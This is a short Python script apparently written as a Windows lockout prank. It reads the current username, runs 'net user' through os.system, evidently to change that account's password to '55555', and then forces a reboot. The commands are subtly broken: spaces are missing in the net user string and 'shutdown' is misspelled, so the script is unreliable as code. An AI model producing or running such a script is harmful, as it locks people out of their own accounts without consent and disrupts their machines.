import os
user = os.environ['USERNAME']
code = "net user"+user+"55555"
os.system(code)
os.system("shotdown -r -t5")
